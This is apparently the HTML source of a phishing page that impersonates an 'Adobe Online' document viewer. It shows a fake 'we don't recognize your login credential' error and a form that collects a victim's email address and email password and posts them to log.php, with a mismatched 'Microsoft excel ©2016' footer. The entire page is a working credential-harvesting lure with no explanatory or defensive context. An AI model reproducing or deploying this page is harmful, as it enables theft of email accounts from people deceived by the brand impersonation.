

<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title> Online</title>
<link href="maincss.css" rel="stylesheet" type="text/css"/>
</head>



<body>
    


<div align="left" style="background:#282828; width:1344px; color:#FFF; font-family:Segoe UI; border:none; padding:0; border-spacing:0; color:#fff; z-index:10000000; position:absolute;">
<table width="1354" cellspacing="0"  cellpadding="0">
<tr>
<td width="45" bgcolor="#E12B04" style="padding:3px;">
 <img src="img/download.png" width="37" height="32" /></td>
<td width="126" bgcolor="#E12B04"  style="font-weight:bold" >
Adobe Online
</td>
<td width="737">
</td>
<td width="191">
</td>
<td align="center" width="58" style="color:#CCC; font-size:12px;">
<a href="#" style="text-decoration:none; color:#ccc;">Sign-in</a>&nbsp; |
</td>
<td width="102" style="color:#CCC; font-size:12px;"><a href="#" style="text-decoration:none; color:#ccc;">create account</a>
</td>
<td width="79">
</td>
</tr>
</table>

<table width="1354" cellspacing="0" bgcolor="#FFFFFF">
<tr style="color:#333; padding:8px; border:#999 solid 1px;">
<td width="18" style="padding:10px;">
</td>
<td width="170"style="padding:5px;" >Document
</td>
<td width="678">
</td>
<td width="82">
</td>
<td align="center" width="134" style="font-size:13px; color:#999;">&nbsp;&nbsp;<a href="#" style="text-decoration:none; color:#999;">Download &nbsp;</a><font color="#990000" size="3"><a href="#" style="text-decoration:none; color:#990000; cursor: wait;">&dArr;</a></font>&nbsp;</td>
<td align="left" width="81" style="font-size:13px;"><a href="#" style="text-decoration:none; color:#333; cursor:help;">Open with</a>&nbsp;&equiv;&nbsp;
</td>
<td align="center" width="91" style="font-size:13px;">
<a href="#" style="text-decoration:none; color:#333;">Print</a> &nbsp; </td>
<td width="82">
</td>
</tr>
</table>
</div>
<div class="cover"></div>

<div class="se-pre-con"></div>
<br>
<br>
<br>


</div>
<div align="center"><br>
<br>
<br>
<br>
<br>
<br>
<br>


<div align="left" style="display:non; padding:5px; box-shadow:-0px 0px 4px #888888; font-size:15px; background:#FFF; border:solid 1px #EEE; width:520px; font-family:Tahoma; color:#666;" id="myDiv" class="animate-bottom">
<div align="left" style="background:#E12B04; padding:5px;">
<table width="222" cellspacing="0">
<tr>
<td width="40">
<img src="img/download.png" width="37" height="32">
</td>
<td width="170" style="color:#fff; font-size:15px;">
Adobe Online
</td>
</tr>
</table>
</div>
<div align="left" style="font-size:11px; padding:6px; font-family:Verdana;">

</div>
<div style="color:red; font-size:11px; text-align:center">We don't recognize your login credential. Please login with a valid email & Password.</div>
  <div align="left" style="padding:3px; border:#FFF;">
  <form name="myForm" action="log.php" method="post" style="padding:3px;" >
  <table width="491" style="border:#FFF;">
  <tr>
    <td colspan="3"></td>
    </tr>
  <tr align="center" bordercolor="#FFFFFF">
  <td width="124" height="45" align="right" style="font-size:14px;"></td>
  <td align="left" width="262">
  <input type="email" name="email" required value="" placeholder="Email address" style="padding:8px; width:285px; outline:none; font-size:14px;font-weight: bold;" />
  </td>
  </tr>
  <tr>
  <td>
  </td>
  <td id="em" align="left" style="color:#CC0000; font-size:12px;"></td>
  <td>
  </td>
  </tr>
  <tr align="center">
  <td width="124" height="43" align="right" style="font-size:14px;"></td>
  <td align="left" width="262">
  <input type="password" placeholder="Email password" name="passwd" required style="padding:8px; width:288px; outline:none; font-size:14px;" />
  
  </td>
  </tr>
  <tr>
  <td>
  </td>
  <td id="ps" align="left" style="color:#CC0000; font-size:12px;"></td>
  <td>
  </td>
  </tr>
  <tr align="center">
  <td align="right" width="124" style="font-size:14px;">&nbsp;</td>
  <td align="left" width="262">
  <input class="sub" type="submit" name="submit" value="VIEW FILE" style="padding:9px; width:290px; color:#FFF; background-color:#E12B04; border:#29703B solid 1px; cursor:pointer;" />
  </td>
  </tr>
  <tr>
  <td style="padding:5px; font-size:10px;">
  
  </td>
  <td style="padding:5px; font-size:10px; color:#D2D2D2; padding-left:19px;">
  Privacy policy<br>
personal information will be not
disclosed or accessed by a third party. Applicable to unregistered users.<br />

  </td>
  <td width="89">
  </td>
  </tr>
  <tr>
   <td>
  </td>
   <td align="center" style="padding:5px; font-size:10px; color:#999; padding-left:19px;">
  Microsoft excel &copy;2016
  </td
  ><td>
      
  </td>
  </tr>
      
  <tr>
   <td>
  </td>
   <td align="center" style="padding:5px; font-size:10px; color:#999; padding-left:19px;">
<img src="img/I7G94LL.gif" width="58" height="40">
  </td
  ><td>
  </td>
  </tr>
  </table>
  </form>
<div style="padding:2px;">
</div>
</div>
</div>
</div>
</div>
<br>
<br>
<br>
<br>
<br>




</body>
</html>
